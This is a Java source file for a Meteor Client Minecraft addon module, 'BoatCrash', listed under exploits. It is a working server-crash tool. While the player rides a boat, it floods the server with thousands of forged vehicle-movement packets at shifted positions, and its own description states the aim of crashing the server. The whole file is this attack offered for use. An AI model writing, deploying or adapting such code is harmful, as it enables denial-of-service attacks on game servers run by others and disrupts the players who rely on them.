package ARm8.eze.modules.exploits;

import ARm8.eze.Addon;
import io.netty.channel.Channel;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

public class BoatCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    public boolean crashing = true;

    private boolean nullCheck = mc.player == null || mc.world == null;

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server.")
        .defaultValue(2000)
        .sliderRange(100, 10000)
        .build());

    private final Setting<Integer> offset = sgGeneral.add(new IntSetting.Builder()
        .name("offset")
        .description("Position offset.")
        .defaultValue(3)
        .sliderRange(0, 50)
        .build());

    
    public BoatCrash() {
        super(Addon.EXPLOITS, "boat-crash", "Crashes the server by spamming movement packets from a boat.");
    }
    
    @Override
    public void onActivate() {
        if(nullCheck){return;}
        if(mc.player.getVehicle() == null && !(mc.player.getVehicle() instanceof BoatEntity)){
            toggle();
            return;
        }
        crashing = true;
        for(int i = 0; i< amount.get().intValue(); i ++){
            if(!crashing){return;}
            Vec3d originalPos = mc.player.getVehicle().getPos();
            mc.player.getVehicle().setPos(mc.player.getVehicle().getX() - offset.get().intValue(), mc.player.getVehicle().getY() - offset.get().intValue(), mc.player.getVehicle().getZ() - offset.get().intValue());
            nettyChannel().writeAndFlush(new VehicleMoveC2SPacket(mc.player.getVehicle()));
            mc.player.getVehicle().setPos(originalPos.getX(), originalPos.getY(), originalPos.getZ());
            nettyChannel().writeAndFlush(new VehicleMoveC2SPacket(mc.player.getVehicle()));
        }
    }

    public Channel nettyChannel() {
        if (mc.player != null && mc.world != null && mc.getNetworkHandler() != null) {
            return mc.getNetworkHandler().getConnection().channel;
        } else {
            return null;
        }
    }

    @EventHandler
    public void onTick(TickEvent event) {
        if(nullCheck){return;}
        if(mc.player.getVehicle() == null && !(mc.player.getVehicle() instanceof BoatEntity) && crashing){
            toggle();
            return;
        }
    }
}
